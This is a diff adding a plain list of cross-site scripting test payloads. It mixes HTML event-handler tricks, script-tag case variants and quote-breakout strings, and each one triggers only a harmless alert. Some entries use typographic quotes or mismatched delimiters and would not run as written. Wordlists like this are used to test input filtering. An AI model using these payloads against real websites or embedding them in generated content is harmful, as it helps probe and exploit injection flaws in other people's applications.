@@ -1,0 +1,36 @@
+<body onafterprint=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<body onhashchange="alert(1)">
+<body onload=alert(1)>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<body onpageshow=alert(1)>
+<body onresize="alert(1)">
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<details ontoggle=alert(1) open>test</details>
+<input onauxclick=alert(1)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<input onchange=alert(1) value=xss>
+<xss onclick="alert(1)">test</xss>
+<xss onkeydown="alert(1)" contenteditable>test</xss>
+<xss onmousedown="alert(1)">test</xss>
+<form onsubmit=alert(1)><input type=submit>
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("HACKED");</script>
+<script>alert(“XSS”)</script> 
+<script>alert(“XSS”);</script>
+<script>alert(‘XSS’)</script>
+“><script>alert(“XSS”)</script>
+<script>alert(/XSS”)</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+‘; alert(1);
+‘)alert(1);//
+<ScRiPt>alert(1)</sCriPt>
